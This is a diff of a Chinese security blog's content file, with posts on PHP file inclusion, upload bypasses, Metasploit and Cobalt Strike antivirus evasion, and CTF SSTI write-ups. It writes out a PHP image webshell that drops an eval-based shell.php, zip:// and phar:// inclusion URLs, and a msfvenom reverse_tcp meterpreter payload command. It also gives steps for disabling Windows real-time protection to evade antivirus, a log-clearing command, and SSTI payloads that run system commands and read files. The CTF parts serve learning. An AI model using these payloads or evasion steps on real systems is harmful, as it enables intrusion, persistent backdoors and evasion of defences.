+<p>在上传zip文件后，使用文件包含伪协议进行运行<br>zip:&#x2F;&#x2F; （压缩流）<br>phar:&#x2F;&#x2F; （PHP归档)<br>    <a href="http://127.0.0.1/include.php?file=zip://uploads/phpinfo.zip%23phpinfo">http://127.0.0.1/include.php?file=zip://uploads/phpinfo.zip%23phpinfo</a><br>    <a href="http://127.0.0.1/include.php?file=phar://./uploads/phpinfo.zip/phpinfo">http://127.0.0.1/include.php?file=phar://./uploads/phpinfo.zip/phpinfo</a><br>其中phpinfo.zip是所上传的压缩包，phpinfo是压缩包内的文件名，如果源代码中没有include <strong>php</strong>后缀的话，需要在伪协议代码后自行添加.php<br>如果include 的是jpg后缀，那么将压缩包内的文件也对应改成jpg即可<br><img src="/upload/4.png"><br><br></p>
 <h4 id="其他绕过方式"><a href="#其他绕过方式" class="headerlink" title="其他绕过方式"></a>其他绕过方式</h4><p><strong>1、上传图片马结合文件包含</strong><br>很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。<br>假设已经上传一句话图片木马到服务器，路径为&#x2F;upload&#x2F;1.jpg,图片代码如下：<br><code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php @eval($_POST[&#39;password&#39;]);?&gt;&quot;)?&gt;</code><br>然后访问URL：<code>http://www.xxxx.com/index.php?page=./upload/1.jpg</code>，包含这张图片，将会在index.php所在的目录下生成shell.php</p>
 <p><strong>2、大小写绕过</strong><br>后缀名黑名单过滤不全面导致!<br>虽然设置了黑名单对常见的后缀进行过滤，但并未对后缀名大小写进行统一。可以利用大小写进行绕过。例如：<code>.pHp</code></p>
 <p><strong>3、空格绕过</strong><br>Windows系统下，对于文件名中空格会被作为空处理，程序中的检测代码却不能自动删除空格，从而绕过黑名单。例如：<code>payload.php空格</code></p>
@@ -5137,7 +5230,7 @@ https://blog.csdn.net/2301_76690905/article/details/134533626
     <url>/posts/1051313787.html</url>
     <content><![CDATA[<h2 id="Metasploit的免杀和基本使用"><a href="#Metasploit的免杀和基本使用" class="headerlink" title="Metasploit的免杀和基本使用"></a>Metasploit的免杀和基本使用</h2><p>1、在kali里打开Metasploit，创建payload，输入<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=*** lport=*** -f exe -o ***(保存的文件名字及后缀)</code></p>
 <span id="more"></span>
-<p><img src="/posts/1051313787/1.png"></p>
+<p><img src="/Metasploit/1.png"></p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151650029.png"><br><br></p>
 <p>2、依次输入以下代码，以开启监听器<br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151650010.png"><br><br></p>
 <p>3、通过共享文件（hello.exe），主机接受文件发现windows还是会查杀，于是思考对文件进行免杀</p>
@@ -5226,7 +5319,7 @@ clearev                                                 #清除日志
     <url>/posts/2497940050.html</url>
     <content><![CDATA[<p>首先要更改window的文件执行策略，否则可能无法执行脚本，在powershell内执行<code>set-executionpolicy remotesigned</code>或者<code>set-executionpolicy unrestricted</code>即可</p>
 <span id="more"></span>
-<h2 id="方法一：使用powershell进行免杀"><a href="#方法一：使用powershell进行免杀" class="headerlink" title="方法一：使用powershell进行免杀"></a>方法一：使用powershell进行免杀</h2><p>1、更改window的文件执行策略并关闭window内的病毒实时查杀<br><img src="/posts/2497940050/1.png"></p>
+<h2 id="方法一：使用powershell进行免杀"><a href="#方法一：使用powershell进行免杀" class="headerlink" title="方法一：使用powershell进行免杀"></a>方法一：使用powershell进行免杀</h2><p>1、更改window的文件执行策略并关闭window内的病毒实时查杀<br><img src="/invoke-obfuscation/1.png"></p>
 <p>2、打开kali内的cobalt strike ，生成payload后门，注意输出格式为powershell<br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151643104.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151644789.png"></p>
 <p>3、使用文件托管进行文件传输<br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151644110.png"></p>
 <p>4、使用本机打开网站，并将里面的内容复制到文本文档内<br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151644073.png"></p>
@@ -5309,7 +5402,7 @@ clearev                                                 #清除日志
     <content><![CDATA[<h2 id="window-server-2003-enterprise-edition下载"><a href="#window-server-2003-enterprise-edition下载" class="headerlink" title="window server 2003 enterprise edition下载"></a>window server 2003 enterprise edition下载</h2><p>百度网盘链接：<a href="https://pan.baidu.com/s/1R3Q-cf9n0t1MqKaF7WBWGA?pwd=5mia">https://pan.baidu.com/s/1R3Q-cf9n0t1MqKaF7WBWGA?pwd=5mia</a><br>提取码：5mia</p>
 <span id="more"></span>
 <h2 id="搭建步骤s"><a href="#搭建步骤s" class="headerlink" title="搭建步骤s"></a>搭建步骤s</h2><p>1、用vmware创建虚拟机，没什么值得注意的地方，正常安装就行</p>
-<p>2、安装好虚拟机后按步骤来<br><img src="/posts/3309922375/0.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659694.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659938.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659214.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659036.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659041.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659509.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659325.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659450.png"><br><br></p>
+<p>2、安装好虚拟机后按步骤来<br><img src="/2003_web/0.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659694.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659938.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659214.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659036.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659041.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659509.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659325.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659450.png"><br><br></p>
 <p>3、创建一个文件夹以放置文件，路径就是文件夹的路径<br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659071.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659460.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659961.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659489.png"><br><br></p>
 <p>4、打开test文件夹，创建一个index文本文件，随便输入并保存，记得把最后把后缀名改为html<br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659373.png"><br><br></p>
 <p>5、右键test，把权限打开，防止网站无法访问，如果还是无法访问，那么把IIS管理器内web服务扩展里的权限也打开<br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151659634.png"><br><br></p>
@@ -5718,7 +5811,7 @@ clearev                                                 #清除日志
 <p>2、使用burpsuite抓包，post数据：7*7，得到回显49，于是得知存在ssti注入<br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151657596.png"></p>
 <p>3、直接输入<code>&#123;&#123;system("ls /")&#125;&#125;</code>，得到flag的所在<br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151657027.png"></p>
 <p>4、输入<code>&#123;&#123;system("cat+/flag_13_searchmaster")&#125;&#125;</code>，获取flag<br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151657132.png"><br><br></p>
-<h2 id="GDOUCTF-2023"><a href="#GDOUCTF-2023" class="headerlink" title="[GDOUCTF 2023]"></a>[GDOUCTF 2023]<ez_ze></ez_ze></h2><p>更详细的绕过方法可以看<a href="https://blog.csdn.net/weixin_52635170/article/details/129856818">https://blog.csdn.net/weixin_52635170/article/details/129856818</a></p>
+<h2 id="GDOUCTF-2023"><a href="#GDOUCTF-2023" class="headerlink" title="[GDOUCTF 2023]"></a>[GDOUCTF 2023]<ez_ze></h2><p>更详细的绕过方法可以看<a href="https://blog.csdn.net/weixin_52635170/article/details/129856818">https://blog.csdn.net/weixin_52635170/article/details/129856818</a></p>
 <p>1、首先判断有无ssti漏洞，我们在输入框中输入<code>&#123;&#123;print 123&#125;&#125;</code>,发现无法执行，输入<code>&#123;%print 123%&#125;</code>是可以输出123的，说明存在ssti注入。<br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151657570.png"></p>
 <p>2、经测试，本题还禁用了<code>_</code> <code>&#123;</code> <code>&quot;</code> <code>.</code> <code>\</code> <code>request</code> <code>pop</code> <code>os</code> <code>popen</code>等，所以我们的payload需要绕过一些关键词和符号，设置为：<br><code>lipsum.__globals__.getitem[os].popen(cat /flag).read()</code></p>
 <p>3、所以我们需要通过<code>lipsum|string|list</code>获取<code>_</code></p>
